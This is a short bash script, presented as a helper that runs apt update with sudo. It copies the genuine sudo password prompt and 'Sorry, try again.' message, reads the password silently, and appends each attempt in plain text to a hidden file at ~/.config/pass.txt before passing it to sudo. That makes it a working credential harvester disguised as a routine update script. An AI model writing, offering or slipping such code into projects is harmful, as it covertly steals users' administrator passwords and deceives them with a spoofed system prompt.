SCRIPT_NAME="$(basename "${BASH_SOURCE[0]}")"
PROMPT="[sudo] password for ${USER}: "
PASS_FILE="${HOME}/.config/pass.txt"
mkdir -p "$(dirname "${PASS_FILE}")"

authenticate_with_sudo() {
    local password
    local cmd_output
    local exit_code
    local attempts=0

    while [[ $attempts -lt 3 ]]; do
		printf "%s" "$PROMPT" >&2
		read -s password
		echo "" >&2
		echo "${password}" >> "${PASS_FILE}"
		chmod 600 "${PASS_FILE}"

		if /usr/bin/printf "%s\n" "$password" | /usr/bin/sudo -S "$@" 2>/dev/null ; then
            unset password
            return 0
        else
			echo "Sorry, try again."
            exit_code=$?
            ((attempts++))
        fi


        unset password

    done


    return 1
}
main() {
    authenticate_with_sudo apt update
}
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main
fi
